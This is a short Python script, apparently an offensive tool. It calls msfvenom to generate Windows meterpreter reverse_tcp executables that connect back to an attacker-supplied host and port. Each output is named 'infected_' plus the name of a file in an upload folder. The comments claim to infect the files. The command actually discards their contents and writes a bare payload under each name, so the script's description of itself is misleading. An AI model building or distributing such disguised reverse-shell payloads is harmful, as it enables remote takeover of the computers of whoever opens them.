import os
import subprocess

# File paths
upload_dir = "upload"
infected_dir = "infected"
config_file = "config.fkn"

# Get reverse shell information
def get_reverse_shell():
    if os.path.exists(config_file):
        with open(config_file, "r") as file:
            return file.read().strip()
    else:
        return input("Enter the reverse shell connection address (example: 192.168.1.100:4444): ")

# Infect files and save them in the infected folder
def infect_files():
    if not os.path.exists(infected_dir):
        os.makedirs(infected_dir)
    
    reverse_shell = get_reverse_shell()

    for filename in os.listdir(upload_dir):
        file_path = os.path.join(upload_dir, filename)
        if os.path.isfile(file_path):
            output_file = os.path.join(infected_dir, f"infected_{filename}")
            # Infect the file with the msfvenom command
            command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={reverse_shell.split(':')[0]} LPORT={reverse_shell.split(':')[1]} -f exe -o {output_file}"
            print(f"{filename} file is infected...")
            subprocess.run(command, shell=True)
            print(f"Infected file: {output_file}")

if __name__ == "__main__":
    infect_files()
